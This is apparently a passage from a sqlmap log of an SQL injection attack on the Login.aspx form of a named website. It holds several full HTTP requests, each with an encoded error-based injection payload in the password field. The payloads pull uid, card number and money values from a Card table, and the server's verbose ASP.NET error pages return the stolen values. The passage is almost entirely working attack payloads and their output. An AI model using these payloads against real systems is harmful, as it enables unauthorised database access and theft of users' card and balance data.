+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq29qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#12]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 498
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%204150%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28uid%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20mKhU&s=false
+
+HTTP response [#12] (500 Internal Server Error):
+Content-length: 8067
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:46 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvqb359736263qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvqb359736263qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvqb359736263qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvqb359736263qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvqb359736263qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#13]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 499
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%208591%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28card%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20ANme&s=false
+
+HTTP response [#13] (500 Internal Server Error):
+Content-length: 8082
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:46 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq4923725623978qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq4923725623978qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq4923725623978qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq4923725623978qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq4923725623978qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#14]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 500
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%205242%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28money%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2852%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20pvGI&s=false
+
+HTTP response [#14] (500 Internal Server Error):
+Content-length: 8037
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:47 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq5000qxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq5000qxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq5000qxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq5000qxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq5000qxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
